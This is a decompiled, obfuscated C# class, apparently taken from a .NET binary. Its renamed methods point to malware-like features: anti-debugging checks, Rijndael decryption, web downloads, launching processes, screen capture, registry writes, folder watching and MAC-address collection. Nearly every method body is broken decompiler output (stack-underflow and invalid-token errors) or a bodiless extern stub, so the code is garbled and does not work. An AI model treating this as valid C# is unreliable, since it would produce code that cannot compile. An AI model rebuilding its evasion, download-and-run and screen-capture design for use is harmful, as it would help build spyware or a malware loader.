using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	private static FileSystemWatcher fileSystemWatcher_0;

	public static extern string smethod_0(string string_4);

	private static extern string smethod_1();

	private static extern void Main();

	private static extern string smethod_2();

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	private static extern bool smethod_3();

	private static extern void smethod_4();

	private static extern void smethod_5(object sender, FileSystemEventArgs e);

	private static extern void smethod_6();

	private static extern void smethod_7();

	public static extern bool smethod_8(string string_4);

	public unsafe Class5()
	{
		//Discarded unreachable code: IL_0016, IL_0023, IL_0028, IL_002e
		//IL_0004: Unsupported input type for neg.
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and O
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		_003F val;
		do
		{
			_ = *(long*)8;
			/*Error near IL_0002: stloc 0 (out-of-bounds)*/;
			val = 0 - /*Error near IL_0005: Stack underflow*/;
		}
		while ((object)checked(/*Error near IL_0006: Stack underflow*/ + val) <= this);
		_003F val2 = /*Error near IL_000d: Stack underflow*/* /*Error near IL_000d: Stack underflow*/;
		_ = /*Error near IL_000e: Stack underflow*// val2;
		/*Error near IL_000e: stloc 0 (out-of-bounds)*/;
		checked
		{
			_ = /*Error near IL_0011: Stack underflow*/* /*Error near IL_0011: Stack underflow*/;
			/*Error near IL_0011: Invalid metadata token*/;
		}
	}

	static byte[] smethod_9(string string_4)
	{
		//Discarded unreachable code: IL_0007, IL_000c, IL_0013, IL_001b, IL_0020, IL_0027, IL_0033
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
		}
	}

	static extern RijndaelManaged smethod_10();

	static extern void smethod_11(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern void smethod_12(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static Encoding smethod_13()
	{
		//Discarded unreachable code: IL_0011
		while (/*Error near IL_0005: Stack underflow*/ == /*Error near IL_0005: Stack underflow*/|| /*Error near IL_000a: Stack underflow*/>= /*Error near IL_000a: Stack underflow*/)
		{
		}
		/*Error near IL_000a: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_000c: Invalid metadata token*/;
	}

	static extern byte[] smethod_14(Encoding encoding_0, string string_4);

	static extern void smethod_15(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_16(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_17(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0);

	static extern void smethod_18(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0);

	static byte[] smethod_19(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		/*Error: Invalid metadata token*/;
	}

	static extern byte[] smethod_20(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern ICryptoTransform smethod_21(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1);

	static extern byte[] smethod_22(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1);

	static extern Encoding smethod_23();

	unsafe static string smethod_24(Encoding encoding_0, byte[] byte_0)
	{
		//Discarded unreachable code: IL_0011, IL_0013, IL_0018, IL_001f
		//IL_0004: Expected I8, but got I4
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		sbyte num = ((sbyte[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		*(long*)(nint)/*Error near IL_0004: Stack underflow*/ = num;
		nuint num2;
		checked
		{
			num2 = (nuint)(ushort)(sbyte)unchecked(/*Error near IL_0006: Stack underflow*/ / encoding_0);
		}
		_ = *(long*)(nint)(/*Error near IL_000a: Stack underflow*/ >> (int)num2);
		/*Error near IL_000c: Invalid metadata token*/;
	}

	static void smethod_25(IDisposable idisposable_0)
	{
		//Discarded unreachable code: IL_0016, IL_001c
		//IL_0006: Invalid comparison between I and Unknown
		//IL_0006: Incompatible stack heights: 0 vs 1
		while ((nint)((IntPtr[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] >= (nint)/*Error near IL_0003: ldloc 0 (out-of-bounds)*/ || (int)/*Error near IL_0011: Stack underflow*/ != 0)
		{
		}
		/*Error near IL_0011: Invalid metadata token*/;
	}

	static extern string smethod_26(string string_4);

	static extern WebClient smethod_27();

	static string smethod_28(string string_4, string string_5)
	{
		switch (/*Error near IL_0006: Stack underflow*/)
		{
		default:
			;
			break;
		}
		/*Error: Unexpected end of block*/;
	}

	static extern void smethod_29(WebClient webClient_0, string string_4, string string_5);

	static extern void smethod_30(Component component_0);

	static extern Process smethod_31();

	static extern ProcessStartInfo smethod_32();

	static extern void smethod_33(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0);

	static extern void smethod_34(ProcessStartInfo processStartInfo_0, string string_4);

	unsafe static string smethod_35(string string_4, string string_5, string string_6)
	{
		//Discarded unreachable code: IL_0008, IL_000d
		_ = *(double*)(nint)/*Error near IL_0001: ldloc 1 (out-of-bounds)*/;
		/*Error near IL_0003: Invalid metadata token*/;
	}

	static extern void smethod_36(ProcessStartInfo processStartInfo_0, string string_4);

	static extern void smethod_37(Process process_0, ProcessStartInfo processStartInfo_0);

	static extern bool smethod_38(Process process_0);

	static extern void smethod_39(int int_0);

	static extern void smethod_40(string string_4);

	static extern string smethod_41(string string_4);

	static extern Rectangle smethod_42(Point point_0);

	static extern Bitmap smethod_43(int int_0, int int_1);

	static Graphics smethod_44(Image image_0)
	{
		//Discarded unreachable code: IL_0005
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_45(Graphics graphics_0, Point point_0, Point point_1, Size size_0);

	static extern ImageFormat smethod_46();

	static extern void smethod_47(Image image_0, string string_4, ImageFormat imageFormat_0);

	static extern bool smethod_48(string string_4);

	static extern void smethod_49(Process process_0);

	static Assembly smethod_50()
	{
		//Discarded unreachable code: IL_0006, IL_000d, IL_0012, IL_0013
		checked
		{
			_ = (nuint)/*Error near IL_0001: Stack underflow*/;
			/*Error near IL_0001: Invalid metadata token*/;
		}
	}

	unsafe static string smethod_51(Assembly assembly_0)
	{
		//Discarded unreachable code: IL_0022, IL_0027, IL_0031, IL_0038, IL_003e, IL_0044, IL_004d, IL_004f, IL_0057, IL_0061, IL_0068, IL_0072
		//IL_0002: Invalid comparison between Unknown and I
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected I8, but got I4
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected F8, but got I
		//IL_004b: Invalid comparison between Unknown and I4
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected I4, but got Unknown
		//IL_006d: Invalid comparison between Unknown and F8
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Incompatible stack heights: 0 vs 1
		while (true)
		{
			IntPtr intPtr = (nint)((Array)/*Error near IL_0001: Stack underflow*/).LongLength;
			if ((nint)/*Error near IL_0007: Stack underflow*/ >= (nint)intPtr)
			{
				continue;
			}
			_003F val = /*Error near IL_0009: Stack underflow*// /*Error near IL_0009: Stack underflow*/;
			*(long*)(nint)/*Error near IL_000d: Stack underflow*/ = (short)val;
			if (/*Error near IL_0012: Stack underflow*/ < /*Error near IL_0012: Stack underflow*/&& /*Error near IL_0017: Stack underflow*/< /*Error near IL_0017: Stack underflow*/)
			{
				_003F val2 = /*Error near IL_0018: Stack underflow*/>> (int)/*Error near IL_0018: Stack underflow*/;
				if (/*Error near IL_001f: Stack underflow*/ <= val2)
				{
					break;
				}
			}
		}
		checked
		{
			_ = /*Error near IL_0052: Stack underflow*/+ /*Error near IL_0052: Stack underflow*/;
			/*Error near IL_0052: Invalid metadata token*/;
		}
	}

	static void smethod_52(string string_4, string string_5, bool bool_5)
	{
		//Discarded unreachable code: IL_000c, IL_0018, IL_0021, IL_002c
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0010: Expected I, but got Unknown
		//IL_0013: Invalid comparison between I4 and Unknown
		//IL_001b: Expected O, but got I4
		//IL_001c: Invalid comparison between Unknown and I
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected I8, but got I4
		checked
		{
			string_4 = (string)(/*Error near IL_0004: Stack underflow*/ - bool_5);
			_ = (ushort)/*Error near IL_0007: Stack underflow*/;
			/*Error near IL_0007: Invalid metadata token*/;
		}
	}

	static extern RegistryKey smethod_53(RegistryKey registryKey_0, string string_4, bool bool_5);

	static extern void smethod_54(RegistryKey registryKey_0, string string_4, object object_0);

	static extern DialogResult smethod_55(string string_4, string string_5, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0);

	static extern string[] smethod_56(string string_4, char[] char_0);

	static string smethod_57(WebClient webClient_0, string string_4)
	{
		//Discarded unreachable code: IL_000f, IL_0019, IL_0020, IL_002a, IL_0031, IL_0036
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected I4, but got Unknown
		//IL_0025: Invalid comparison between Unknown and F8
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Incompatible stack heights: 0 vs 1
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected F8, but got I
		while ((int)/*Error near IL_0009: Stack underflow*/ == -592299007)
		{
		}
		checked
		{
			_ = /*Error near IL_000a: Stack underflow*/+ /*Error near IL_000a: Stack underflow*/;
			/*Error near IL_000a: Invalid metadata token*/;
		}
	}

	static string smethod_58()
	{
		//Discarded unreachable code: IL_000c, IL_0016, IL_001b, IL_0020, IL_002d
		//IL_0011: Invalid comparison between Unknown and F8
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected F8, but got I
		while (/*Error near IL_0005: Stack underflow*/ < /*Error near IL_0005: Stack underflow*/)
		{
		}
		/*Error near IL_0007: Invalid metadata token*/;
	}

	static extern string smethod_59(string[] string_4);

	static void smethod_60(string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0005
		/*Error: Invalid metadata token*/;
	}

	static extern NetworkInterface[] smethod_61();

	static OperationalStatus smethod_62(NetworkInterface networkInterface_0)
	{
		//Discarded unreachable code: IL_000a, IL_0011, IL_0016, IL_0021, IL_0027, IL_0032, IL_0035, IL_003a
		//IL_0019: Expected O, but got F4
		//IL_001c: Invalid comparison between Unknown and I4
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		_ = (ushort)null;
		/*Error near IL_0004: ldloc 0 (out-of-bounds)*/;
		/*Error near IL_0005: Invalid metadata token*/;
	}

	static extern PhysicalAddress smethod_63(NetworkInterface networkInterface_0);

	static string smethod_64(object object_0)
	{
		//Discarded unreachable code: IL_0007, IL_000a, IL_000f
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected I8, but got I4
		_ = ((IntPtr[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		/*Error near IL_0002: Invalid metadata token*/;
	}

	static extern string smethod_65(string string_4, char[] char_0);

	static extern Process smethod_66();

	static extern IntPtr smethod_67(Process process_0);

	static extern FileSystemWatcher smethod_68();

	static extern string smethod_69(Environment.SpecialFolder specialFolder_0);

	static extern void smethod_70(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_71(FileSystemWatcher fileSystemWatcher_1, NotifyFilters notifyFilters_0);

	static extern void smethod_72(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_73(FileSystemWatcher fileSystemWatcher_1, FileSystemEventHandler fileSystemEventHandler_0);

	static extern void smethod_74(FileSystemWatcher fileSystemWatcher_1, bool bool_5);

	static bool smethod_75(string string_4, string string_5)
	{
		/*Error: ldloca 0 (out-of-bounds)*/;
		/*Error near IL_0002: Invalid metadata token*/;
	}

	static bool smethod_76(string string_4)
	{
		//Discarded unreachable code: IL_0003, IL_0008
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		_ = /*Error near IL_0002: Stack underflow*/+ /*Error near IL_0002: Stack underflow*/;
		/*Error near IL_0002: Unknown opcode: 0xFB*/;
	}

	static extern string[] smethod_77(string string_4, string string_5);

	static extern bool smethod_78(string string_4, string string_5);

	static extern Match smethod_79(string string_4, string string_5);

	static extern WebHeaderCollection smethod_80(WebClient webClient_0);

	static void smethod_81(WebHeaderCollection webHeaderCollection_0, HttpRequestHeader httpRequestHeader_0, string string_4)
	{
		//Discarded unreachable code: IL_0008, IL_000d, IL_0014, IL_0019, IL_001c
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		_ = ((long[])(int)/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: ldarg 3 (out-of-bounds)*/];
		/*Error near IL_0003: Invalid metadata token*/;
	}
}
